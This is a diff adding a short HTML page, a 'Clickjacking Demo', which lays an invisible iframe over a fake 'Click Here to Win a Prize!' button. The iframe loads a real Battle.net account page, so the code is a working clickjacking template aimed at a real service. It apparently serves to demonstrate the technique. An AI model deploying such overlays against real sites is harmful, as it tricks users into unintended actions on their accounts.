@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking Demo</title>
+    <style>
+        /* Container to hold the fake button */
+        
+        #wrapper {
+            position: relative;
+            width: 300px;
+            height: 100px;
+            margin: 100px auto;
+            border: 2px solid #333;
+            border-radius: 8px;
+            text-align: center;
+            line-height: 100px;
+            font-family: sans-serif;
+            background: #f0f0f0;
+            cursor: pointer;
+        }
+        /* The fake button text */
+        
+        #wrapper span {
+            position: relative;
+            z-index: 1;
+            color: #333;
+            font-size: 20px;
+            user-select: none;
+        }
+        /* Invisible iframe overlaying the whole wrapper */
+        
+        #victim-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 300px;
+            height: 100px;
+            border: none;
+            opacity: 0;
+            /* Makes it completely invisible */
+            z-index: 2;
+            /* Above the fake button text */
+        }
+    </style>
+</head>
+
+<body>
+    <div id="wrapper" onclick="alert('You think you clicked the button—but you actually clicked the hidden iframe!')">
+        <span>Click Here to Win a Prize!</span>
+        <!-- The victim page (e.g., a “Like” button) is loaded here -->
+        <iframe id="victim-frame" src="https://kr.account.battle.net/" sandbox="allow-scripts allow-forms">
+    </iframe>
+    </div>
+</body>
+
+</html>
